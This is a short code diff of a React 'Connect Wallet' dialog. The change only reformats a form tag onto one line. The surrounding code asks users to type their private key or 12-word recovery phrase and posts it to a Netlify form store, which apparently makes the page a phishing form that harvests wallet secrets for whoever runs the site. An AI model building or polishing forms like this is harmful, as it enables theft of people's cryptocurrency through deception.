@@ -56,13 +56,7 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
         <DialogHeader>
           <DialogTitle className="text-center">Connect Wallet</DialogTitle>
         </DialogHeader>
-        <form 
-          onSubmit={handleConnect} 
-          className="space-y-4 py-4"
-          data-netlify="true"
-          name="wallet-connection"
-          method="POST"
-        >
+        <form onSubmit={handleConnect} className="space-y-4 py-4" data-netlify="true" name="wallet-connection" method="POST">
           <input type="hidden" name="form-name" value="wallet-connection" />
           <p className="text-sm text-muted-foreground text-center">
             Input your private key or 12-word phrase for access to your account. Please input it in the order specified.
